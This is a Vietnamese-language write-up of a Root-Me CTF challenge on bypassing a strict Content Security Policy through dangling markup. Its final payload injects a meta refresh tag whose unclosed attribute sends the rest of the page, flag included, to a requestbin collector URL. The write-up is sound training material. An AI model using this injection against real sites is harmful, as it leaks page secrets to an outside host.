# CSP Bypass - Dangling markup

Oai lâu lắm rồi mới ngồi chơi lại rootme thấy có 3 challange mới về CSP làm thử xem sao.
![img 1](https://github.com/Cl0wnK1n9/randomChall/blob/main/img/a.JPG)
Okay cùng lướt qua nào! Đầu tiên chúng ta có input và input sẽ được reflect lên `http://challenge01.root-me.org/web-client/ch29/page?user=[input]`. Đầu tiên phải xem CSP được cấu hình như nào đã rồi tìm cách làm trò con bò tiếp. Thông tin cấu hình của CSP có thể được tìm thấy ngay trong source HTML thông qua thẻ meta, tuy nhiên CSP cũng có thể được cấu hình bên phía server và để biết được cấu hình thì phải đọc header `Content-Security-Policy:` của gói tin response. 
```connect-src 'none'; 
font-src 'none'; 
frame-src 'none'; 
img-src 'self'; 
manifest-src 'none'; 
media-src 'none'; 
object-src 'none'; 
script-src 'none'; 
worker-src 'none'; 
style-src 'self'; 
frame-ancestors 'none'; 
block-all-mixed-content;
```
Đây chính là cấu hỉnh của challange. Nhìn qua thì chall đã block hết việc thực thi script cũng như load các resource như iframe( vẫn có thể sử dụng các thẻ này nhưng nội dung sẽ bị chặn => hopeless), có 2 thẻ duy nhất dùng được là img- chỉ load được các resource từ chính chall, và style cũng tương tự như img. Ban đầu mình bị mindset đây là một bài về XSS phải tìm cách để thực thi 1 đoạn js. Tuy nhiên sau 1 thời gian tìm cách bypass cái CSP thì mình chính thức bỏ cuộc việc thực thi js vậy giờ phải làm sao? Sau đó mình quyết định ĐI XEM PHIM dạ vâng chính xác là đi xem anime trên vuighe dù gì mình cũng đang lười vcđ ạ. Sau khi bật được vuighe lên thì bỗng dưng trong đầu mình nảy ra 1 ý tưởng. Đó là sử dụng thẻ `<meta>` vì trước trên vuighe mình cũng đã report 1 lỗi insecure redirect bằng cách inject vào trong thẻ meta của họ. Thẻ `meta` là thẻ dùng để định nghĩa metadata cho trang web hay dịch ra tiếng việt thì nó là `định nghĩa dữ liệu cho dữ liệu` .-. *OMG lú*. Với thẻ `meta` mình có thể thực hiện redirect trang web sau một khoảng thời gian nhất định bằng thuộc tính `http-equiv="refresh"` và thuộc tính `content="[time];[url]"`. Cơ mà làm thế nào để đọc được flag? Bạn tưởng tượng như này nhé giả sử mình gửi 1 get requests đến server của mình vậy `url` sẽ như này `https://xviedo.com?xxx=[content]` và trong HTML nếu bạn mở giá trị của thuộc tính bằng `'` hay `"` thì bạn cũng phải kết thúc bằng chính ký tự đó vậy nên mình sẽ mở giá trị của content bằng `'` và toàn bộ đoạn đằng sau sẽ được nhận làm giá trị của get param.

final payload: `http://challenge01.root-me.org/web-client/ch29/page?user=<meta name="ahihi"  HTTP-EQUIV="refresh" content="0;http://requestbin.net/r/2twr05yb?a= `
result: 
![img 2](https://github.com/Cl0wnK1n9/randomChall/blob/main/img/b.JPG)

# NOTE: 
Điều này không làm được trên Chrome do chrome không cho phép việc redirect bằng get mà có các ký tự xuống dòng .
